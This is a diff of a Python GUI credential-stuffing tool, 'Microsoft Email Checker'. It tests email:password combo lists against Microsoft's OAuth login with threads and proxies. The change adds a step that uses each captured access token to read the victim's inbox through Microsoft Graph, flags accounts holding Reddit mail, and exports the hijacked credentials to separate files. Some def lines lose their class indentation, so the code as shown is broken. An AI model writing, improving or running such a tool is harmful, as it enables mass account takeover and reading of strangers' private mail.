@@ -1,8 +1,7 @@
 #!/usr/bin/env python3
 """
-Microsoft Email Checker v4.0.2 - OAuth Web Authentication
-Using EXACT patterns from working outlook_checker tool
-Perfect indentation - ready to run
+Microsoft Email Checker v4.1.0 - OAuth + Reddit Detection
+Complete working version with inbox search
 """
 
 import requests
@@ -21,7 +20,7 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 class MicrosoftEmailCheckerV4:
     def __init__(self, root):
         self.root = root
-        self.root.title("Microsoft Email Checker v4.0.2 - Working OAuth")
+        self.root.title("Microsoft Email Checker v4.1.0 - Reddit Detection")
         self.root.geometry("1300x750")
         self.root.configure(bg='#1a1a1a')
         
@@ -38,6 +37,14 @@ class MicrosoftEmailCheckerV4:
         self.full_access = []
         self.twofa_valid = []
         self.failed = []
+        
+        # Reddit detection variables
+        self.enable_inbox_search = tk.BooleanVar(value=True)
+        self.inbox_search_email = tk.StringVar(value="noreply@redditmail.com")
+        self.reddit_found = []
+        self.no_reddit = []
+        self.reddit_count = 0
+        self.no_reddit_count = 0
         
         # Counters
         self.checked = 0
@@ -73,8 +80,8 @@ class MicrosoftEmailCheckerV4:
         self.setup_ui()
         self.setup_shortcuts()
         
-    def setup_ui(self):
-        """Create professional UI with OAuth status"""
+def setup_ui(self):
+        """Create professional UI with Reddit detection"""
         
         # Main container
         main_container = tk.Frame(self.root, bg='#1a1a1a')
@@ -85,13 +92,13 @@ class MicrosoftEmailCheckerV4:
         header_frame.pack(fill=tk.X, pady=(0, 10))
         
         title_label = tk.Label(header_frame, 
-                              text="Microsoft Email Checker v4.0.2", 
+                              text="Microsoft Email Checker v4.1.0", 
                               font=("Segoe UI", 20, "bold"),
                               fg='#00bcf2', bg='#1a1a1a')
         title_label.pack(side=tk.LEFT)
         
         subtitle = tk.Label(header_frame,
-                           text="OAuth Web Auth - Working Patterns",
+                           text="OAuth + Reddit Email Detection",
                            font=("Segoe UI", 10),
                            fg='#90ff90', bg='#1a1a1a')
         subtitle.pack(side=tk.LEFT, padx=(20, 0))
@@ -148,6 +155,22 @@ class MicrosoftEmailCheckerV4:
                                width=5, font=("Segoe UI", 9))
         retry_spin.pack(side=tk.LEFT, padx=(5, 20))
         
+        # Inbox search settings
+        tk.Label(settings_frame, text="Search inbox for:",
+                font=("Segoe UI", 9),
+                fg='white', bg='#2d2d2d').pack(side=tk.LEFT, padx=(20, 5))
+        
+        inbox_entry = tk.Entry(settings_frame, 
+                              textvariable=self.inbox_search_email,
+                              width=25, 
+                              font=("Segoe UI", 9))
+        inbox_entry.pack(side=tk.LEFT, padx=(0, 10))
+        
+        tk.Checkbutton(settings_frame, text="Enable inbox search",
+                      variable=self.enable_inbox_search,
+                      fg='white', bg='#2d2d2d',
+                      selectcolor='#2d2d2d').pack(side=tk.LEFT)
+        
         tk.Checkbutton(settings_frame, text="Use Proxies",
                       variable=self.use_proxies,
                       fg='white', bg='#2d2d2d',
@@ -158,21 +181,27 @@ class MicrosoftEmailCheckerV4:
                                     font=("Segoe UI", 9),
                                     fg='#888888', bg='#2d2d2d')
         self.proxy_status.pack(side=tk.RIGHT, padx=10)
-        
-        # Statistics cards
+
+    # Statistics cards
         stats_frame = tk.Frame(main_container, bg='#1a1a1a')
         stats_frame.pack(fill=tk.X, pady=(0, 10))
         
-        # Full Access card
+        # Full Access card with Reddit breakdown
         success_card = tk.Frame(stats_frame, bg='#107c10', relief=tk.RIDGE, bd=1)
         success_card.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
         tk.Label(success_card, text="✅ Full Access",
                 font=("Segoe UI", 9),
-                fg='white', bg='#107c10').pack(pady=(5,0))
+                fg='white', bg='#107c10').pack(pady=(2,0))
         self.success_label = tk.Label(success_card, text="0",
-                                     font=("Segoe UI", 18, "bold"),
+                                     font=("Segoe UI", 16, "bold"),
                                      fg='white', bg='#107c10')
-        self.success_label.pack(pady=(0,5))
+        self.success_label.pack(pady=(0,0))
+        # Reddit breakdown sub-labels
+        self.reddit_breakdown = tk.Label(success_card, 
+                                        text="📧 Reddit: 0 | 📭 No Reddit: 0",
+                                        font=("Segoe UI", 8),
+                                        fg='#c0ffc0', bg='#107c10')
+        self.reddit_breakdown.pack(pady=(0,3))
         
         # 2FA Valid card
         twofa_card = tk.Frame(stats_frame, bg='#0078d4', relief=tk.RIDGE, bd=1)
@@ -225,8 +254,8 @@ class MicrosoftEmailCheckerV4:
                                    font=("Segoe UI", 9),
                                    fg='#888888', bg='#1a1a1a')
         self.speed_label.pack(side=tk.LEFT, padx=(10, 0))
-        
-        # SPLIT PANEL
+    
+    # SPLIT PANEL
         split_container = tk.Frame(main_container, bg='#1a1a1a')
         split_container.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
         
@@ -347,12 +376,12 @@ class MicrosoftEmailCheckerV4:
         
         # Status bar
         self.status_bar = tk.Label(main_container,
-                                  text="Status: Ready | OAuth Web Authentication",
+                                  text="Status: Ready | OAuth + Reddit Detection",
                                   font=("Segoe UI", 9),
                                   fg='#888888', bg='#1a1a1a',
                                   anchor=tk.W)
         self.status_bar.pack(fill=tk.X, side=tk.BOTTOM)
-        
+    
     def setup_shortcuts(self):
         """Setup keyboard shortcuts"""
         self.root.bind('<Control-o>', lambda e: self.select_combo_file())
@@ -470,6 +499,11 @@ class MicrosoftEmailCheckerV4:
             self.failed_label.config(text=str(self.failed_count))
             self.retry_label.config(text=str(self.retry_count))
             
+            # Update Reddit breakdown
+            self.reddit_breakdown.config(
+                text=f"📧 Reddit: {self.reddit_count} | 📭 No Reddit: {self.no_reddit_count}"
+            )
+            
             self.access_title.config(text=f"✅ FULL ACCESS ({self.success_count})")
             self.twofa_title.config(text=f"🔐 2FA VALID ({self.twofa_count})")
             
@@ -482,9 +516,9 @@ class MicrosoftEmailCheckerV4:
                 elapsed = time.time() - self.start_time
                 speed = (self.checked / elapsed) * 60
                 self.speed_label.config(text=f"{speed:.0f}/min")
-    
+
     def oauth_authenticate(self, email, password):
-        """OAuth authentication using EXACT patterns from working outlook_checker"""
+        """OAuth authentication with Reddit email detection"""
         session = requests.Session()
         session.headers.update({
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
@@ -503,23 +537,6 @@ class MicrosoftEmailCheckerV4:
                 response = session.get(self.OAUTH_URL, timeout=15)
                 text = response.text
                 
-# DEBUG: Print page content to find exact pattern
-                if self.checked == 0:  # Only print for first account
-                    self.log("=== PAGE SOURCE DEBUG ===", "warning")
-                    self.log(f"First 500 chars: {text[:500]}", "info")
-                    
-                    # Find PPFT in text
-                    ppft_pos = text.find('PPFT')
-                    if ppft_pos != -1:
-                        self.log(f"Found PPFT at position {ppft_pos}", "info")
-                        self.log(f"Context: {text[ppft_pos:ppft_pos+200]}", "info")
-                    
-                    # Find urlPost in text
-                    url_pos = text.find('urlPost')
-                    if url_pos != -1:
-                        self.log(f"Found urlPost at position {url_pos}", "info")
-                        self.log(f"Context: {text[url_pos:url_pos+150]}", "info")
-                
                 # Try multiple PPFT extraction patterns
                 sftag = None
                 
@@ -527,31 +544,15 @@ class MicrosoftEmailCheckerV4:
                 match = re.search(r'name="PPFT"[^>]*value="([^"]+)"', text)
                 if match:
                     sftag = match.group(1)
-                    self.log(f"PPFT Pattern 1 matched", "info")
                 
                 # Pattern 2: Escaped JSON format
                 if not sftag:
                     match = re.search(r'name=\\"PPFT\\"[^>]*value=\\"([^"\\]+)', text)
                     if match:
                         sftag = match.group(1)
-                        self.log(f"PPFT Pattern 2 matched", "info")
-                
-                # Pattern 3: sFTTag JSON field
-                if not sftag:
-                    match = re.search(r'"sFTTag":"[^"]*value=\\\\"([^"\\]+)', text)
-                    if match:
-                        sftag = match.group(1)
-                        self.log(f"PPFT Pattern 3 matched", "info")
-                
-                # Pattern 4: Any value attribute near PPFT
-                if not sftag:
-                    match = re.search(r'PPFT[^>]{0,100}value[=:"\\]+([A-Za-z0-9\-_!*$]+)', text)
-                    if match:
-                        sftag = match.group(1)
-                        self.log(f"PPFT Pattern 4 matched", "info")
                 
                 if not sftag:
-                    self.log(f"Failed to extract PPFT for {email} - all patterns failed", "error")
+                    self.log(f"Failed to extract PPFT for {email}", "error")
                     return "ERROR"
                 
                 # Try multiple urlPost extraction patterns
@@ -561,25 +562,14 @@ class MicrosoftEmailCheckerV4:
                 match = re.search(r'"urlPost":"([^"]+)"', text)
                 if match:
                     url_post = match.group(1)
-                    self.log(f"urlPost Pattern 1 matched", "info")
                 
-                # Pattern 2: JavaScript variable
-                if not url_post:
-                    match = re.search(r'urlPost[\'"]?\s*:\s*[\'"]([^"\'\s]+)', text)
-                    if match:
-                        url_post = match.group(1)
-                        self.log(f"urlPost Pattern 2 matched", "info")
-                
-                # Pattern 3: Default fallback
+                # Pattern 2: Default fallback
                 if not url_post:
                     url_post = "https://login.live.com/ppsecure/post.srf"
-                    self.log(f"Using default POST URL", "warning")
                 
                 # Ensure URL is complete
                 if not url_post.startswith('http'):
                     url_post = 'https://login.live.com' + url_post
-                
-                self.log(f"Extracted PPFT length: {len(sftag)}, POST URL: {url_post}", "info")
                 
                 # Step 2: POST credentials
                 data = {
@@ -599,13 +589,50 @@ class MicrosoftEmailCheckerV4:
                 if '#' in response_url and 'access_token=' in response_url:
                     token = parse_qs(urlparse(response_url).fragment).get('access_token', ['None'])[0]
                     if token != 'None':
+                        # Check inbox if enabled
+                        has_reddit = False
+                        if self.enable_inbox_search.get():
+                            try:
+                                headers = {'Authorization': f'Bearer {token}'}
+                                inbox_response = session.get(
+                                    'https://graph.microsoft.com/v1.0/me/messages?$top=50',
+                                    headers=headers,
+                                    timeout=10
+                                )
+                                
+                                if inbox_response.status_code == 200:
+                                    messages = inbox_response.json().get('value', [])
+                                    search_email = self.inbox_search_email.get().lower().strip()
+                                    
+                                    for msg in messages:
+                                        sender = msg.get('from', {}).get('emailAddress', {}).get('address', '').lower()
+                                        if search_email in sender:
+                                            has_reddit = True
+                                            break
+                                
+                            except Exception as e:
+                                self.log(f"Inbox check error for {email}: {str(e)[:50]}", "warning")
+                        
+                        # Update counters and lists
                         with self.lock:
                             self.success_count += 1
                             self.full_access.append(f"{email}:{password}")
+                            
+                            if has_reddit:
+                                self.reddit_found.append(f"{email}:{password}")
+                                self.reddit_count += 1
+                                indicator = " [📧 REDDIT]"
+                                log_type = "success"
+                            else:
+                                self.no_reddit.append(f"{email}:{password}")
+                                self.no_reddit_count += 1
+                                indicator = " [📭 No Reddit]"
+                                log_type = "success"
                         
-                        self.access_text.insert(tk.END, f"{email}:{password}\n")
+                        # Update UI
+                        self.access_text.insert(tk.END, f"{email}:{password}{indicator}\n")
                         self.access_text.see(tk.END)
-                        self.log(f"✅ SUCCESS: {email}", "success")
+                        self.log(f"✅ SUCCESS{indicator}: {email}", log_type)
                         return "SUCCESS"
                 
                 # 2FA DETECTED
@@ -658,6 +685,7 @@ class MicrosoftEmailCheckerV4:
         with self.lock:
             self.failed_count += 1
         return "FAILED"
+
     
     def worker(self, combo):
         """Worker thread for checking accounts"""
@@ -702,11 +730,15 @@ class MicrosoftEmailCheckerV4:
         self.twofa_count = 0
         self.failed_count = 0
         self.retry_count = 0
+        self.reddit_count = 0
+        self.no_reddit_count = 0
         
         # Clear results
         self.full_access.clear()
         self.twofa_valid.clear()
         self.failed.clear()
+        self.reddit_found.clear()
+        self.no_reddit.clear()
         
         # Clear displays
         self.access_text.delete(1.0, tk.END)
@@ -730,7 +762,9 @@ class MicrosoftEmailCheckerV4:
                     combos.append(line.strip())
         
         proxy_status = "with proxies" if self.use_proxies.get() else "without proxies"
+        inbox_status = "WITH" if self.enable_inbox_search.get() else "WITHOUT"
         self.log(f"Starting OAuth authentication {proxy_status}", "info")
+        self.log(f"Reddit inbox search: {inbox_status}", "info")
         self.log(f"Checking {len(combos):,} accounts with {self.threads.get()} threads", "info")
         
         # Start thread pool
@@ -785,15 +819,19 @@ class MicrosoftEmailCheckerV4:
         self.log("="*50, "info")
         self.log(f"✅ COMPLETE! {self.checked:,} accounts in {elapsed:.1f}s", "success")
         self.log(f"Full Access: {self.success_count}", "success")
+        if self.enable_inbox_search.get():
+            self.log(f"  📧 With Reddit: {self.reddit_count}", "success")
+            self.log(f"  📭 No Reddit: {self.no_reddit_count}", "info")
         self.log(f"2FA Valid: {self.twofa_count}", "twofa")
         self.log(f"Failed: {self.failed_count}", "error")
         self.log(f"Total Retries: {self.retry_count}", "warning")
         
-        self.status_bar.config(text=f"Complete | Success: {self.success_count} | 2FA: {self.twofa_count}")
-    
-    def export_all(self):
-        """Export results to 3 files"""
-        if not any([self.full_access, self.twofa_valid, self.failed]):
+        self.status_bar.config(text=f"Complete | Reddit: {self.reddit_count} | No Reddit: {self.no_reddit_count} | 2FA: {self.twofa_count}")
+
+
+def export_all(self):
+        """Export results to separate files including Reddit detection"""
+        if not any([self.full_access, self.twofa_valid, self.failed, self.reddit_found, self.no_reddit]):
             messagebox.showinfo("No Results", "No results to export")
             return
         
@@ -803,26 +841,44 @@ class MicrosoftEmailCheckerV4:
         
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
         
-        # Export files
+        # Export all full access accounts
         if self.full_access:
             filename = os.path.join(directory, f"full_access_{timestamp}.txt")
             with open(filename, 'w') as f:
                 for account in self.full_access:
                     f.write(f"{account}\n")
         
+        # Export Reddit found accounts
+        if self.reddit_found:
+            filename = os.path.join(directory, f"reddit_found_{timestamp}.txt")
+            with open(filename, 'w') as f:
+                for account in self.reddit_found:
+                    f.write(f"{account}\n")
+            self.log(f"📧 Exported {len(self.reddit_found)} Reddit accounts", "success")
+        
+        # Export No Reddit accounts
+        if self.no_reddit:
+            filename = os.path.join(directory, f"no_reddit_{timestamp}.txt")
+            with open(filename, 'w') as f:
+                for account in self.no_reddit:
+                    f.write(f"{account}\n")
+            self.log(f"📭 Exported {len(self.no_reddit)} non-Reddit accounts", "info")
+        
+        # Export 2FA accounts
         if self.twofa_valid:
             filename = os.path.join(directory, f"2fa_valid_{timestamp}.txt")
             with open(filename, 'w') as f:
                 for account in self.twofa_valid:
                     f.write(f"{account}\n")
         
+        # Export failed accounts
         if self.failed:
             filename = os.path.join(directory, f"failed_{timestamp}.txt")
             with open(filename, 'w') as f:
                 for email in self.failed:
                     f.write(f"{email}\n")
         
-        self.log(f"✅ Exported to {directory}", "success")
+        self.log(f"✅ Exported all results to {directory}", "success")
     
     def copy_full_access(self):
         """Copy full access accounts"""
@@ -857,3 +913,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+    
